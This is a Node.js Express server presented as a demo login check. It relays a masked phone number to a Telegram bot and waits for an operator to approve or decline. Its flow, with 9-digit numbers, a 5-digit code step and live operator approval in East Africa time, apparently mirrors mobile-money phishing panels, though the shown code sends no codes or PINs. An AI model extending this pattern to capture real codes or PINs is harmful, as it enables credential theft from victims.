const express = require('express');
const axios = require('axios');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TELEGRAM_API = TELEGRAM_BOT_TOKEN
  ? `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`
  : null;
const REQUEST_TTL_MS = 10 * 60 * 1000;
const requests = new Map();

app.disable('x-powered-by');
app.use(express.json({ limit: '10kb' }));
app.use(express.static(__dirname, { index: 'index.html' }));

function maskPhone(phone) {
  return phone.length > 4 ? `${phone.slice(0, 2)}••••${phone.slice(-2)}` : '••••';
}

function nowEastAfrica() {
  return new Intl.DateTimeFormat('en-GB', {
    timeZone: 'Africa/Nairobi', dateStyle: 'medium', timeStyle: 'short'
  }).format(new Date());
}

app.post('/api/requests', async (req, res) => {
  const phone = String(req.body?.phone || '').replace(/\D/g, '');
  const hasFiveDigits = req.body?.hasFiveDigits === true;

  // This is an independent demo login. Never request or transmit financial PINs.
  if (!/^\d{9}$/.test(phone)) {
    return res.status(400).json({ success: false, message: 'Enter a valid 9-digit demo phone number.' });
  }
  if (!hasFiveDigits) {
    return res.status(400).json({ success: false, message: 'Complete the 5-digit demo verification step.' });
  }

  const id = crypto.randomUUID();
  const request = { id, phone, status: 'pending', createdAt: Date.now(), telegramMessageId: null };
  requests.set(id, request);

  if (!TELEGRAM_API || !CHAT_ID) {
    // A missing Telegram configuration should be explicit, not falsely report approval.
    requests.delete(id);
    return res.status(503).json({ success: false, message: 'Approval service is not configured yet.' });
  }

  const text = [
    '🔐 Demo login approval requested',
    '',
    `Request: ${id}`,
    `Phone: ${maskPhone(phone)}`,
    `Time: ${nowEastAfrica()}`,
    'Demo code: 00000 (fixed test value)',
    '',
    'The value above is a fixed demo label, not the code entered by the visitor. No entered code or financial PIN is collected or sent.'
  ].join('\n');

  try {
    const sent = await axios.post(`${TELEGRAM_API}/sendMessage`, {
      chat_id: CHAT_ID,
      text,
      reply_markup: { inline_keyboard: [[
        { text: '✅ Approve', callback_data: `approve:${id}` },
        { text: '❌ Decline', callback_data: `decline:${id}` }
      ]] }
    }, { timeout: 10000 });
    request.telegramMessageId = sent.data.result.message_id;
    return res.json({ success: true, requestId: id, status: request.status });
  } catch (error) {
    requests.delete(id);
    console.error('Telegram notification failed:', error.response?.data || error.message);
    return res.status(502).json({ success: false, message: 'Could not notify the approval bot. Please try again later.' });
  }
});

app.get('/api/requests/:id', (req, res) => {
  const request = requests.get(req.params.id);
  if (!request || Date.now() - request.createdAt > REQUEST_TTL_MS) {
    if (request) requests.delete(req.params.id);
    return res.status(404).json({ success: false, message: 'Request expired. Please try again.' });
  }
  res.set('Cache-Control', 'no-store');
  return res.json({ success: true, status: request.status });
});

async function answerCallback(callbackId, text) {
  try {
    await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
      callback_query_id: callbackId, text
    }, { timeout: 10000 });
  } catch (error) {
    console.error('Telegram callback response failed:', error.response?.data || error.message);
  }
}

async function handleCallback(callback) {
  const message = callback.message;
  if (!message || String(message.chat.id) !== String(CHAT_ID)) {
    return answerCallback(callback.id, 'Not authorized.');
  }

  const match = String(callback.data || '').match(/^(approve|decline):([a-f0-9-]+)$/i);
  if (!match) return answerCallback(callback.id, 'Invalid action.');

  const request = requests.get(match[2]);
  if (!request || Date.now() - request.createdAt > REQUEST_TTL_MS) {
    return answerCallback(callback.id, 'This request expired.');
  }
  if (request.status !== 'pending') {
    return answerCallback(callback.id, `Already ${request.status}.`);
  }

  request.status = match[1].toLowerCase() === 'approve' ? 'approved' : 'declined';
  await answerCallback(callback.id, request.status === 'approved' ? 'Demo request approved.' : 'Demo request declined.');

  try {
    await axios.post(`${TELEGRAM_API}/editMessageText`, {
      chat_id: CHAT_ID,
      message_id: message.message_id,
      text: `${message.text || 'Demo login approval'}\n\nDecision: ${request.status.toUpperCase()}`,
      reply_markup: { inline_keyboard: [] }
    }, { timeout: 10000 });
  } catch (error) {
    console.error('Could not update Telegram message:', error.response?.data || error.message);
  }
}

async function pollTelegram() {
  if (!TELEGRAM_API || !CHAT_ID) {
    console.log('Telegram approval is not configured. Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID.');
    return;
  }
  let offset = 0;
  try {
    await axios.post(`${TELEGRAM_API}/deleteWebhook`, { drop_pending_updates: false }, { timeout: 10000 });
  } catch (error) {
    console.error('Telegram polling setup failed:', error.response?.data || error.message);
  }
  console.log('Telegram approval polling started. Use a dedicated bot for this app.');
  while (true) {
    try {
      const response = await axios.get(`${TELEGRAM_API}/getUpdates`, {
        params: { offset, timeout: 25, allowed_updates: JSON.stringify(['callback_query']) },
        timeout: 35000
      });
      for (const update of response.data.result || []) {
        offset = update.update_id + 1;
        if (update.callback_query) await handleCallback(update.callback_query);
      }
    } catch (error) {
      console.error('Telegram polling error:', error.response?.data || error.message);
      await new Promise(resolve => setTimeout(resolve, 3000));
    }
  }
}

setInterval(() => {
  const cutoff = Date.now() - REQUEST_TTL_MS;
  for (const [id, request] of requests.entries()) {
    if (request.createdAt < cutoff) requests.delete(id);
  }
}, 60_000);

app.listen(PORT, () => {
  console.log(`Demo verification app running on port ${PORT}`);
  pollTelegram();
});
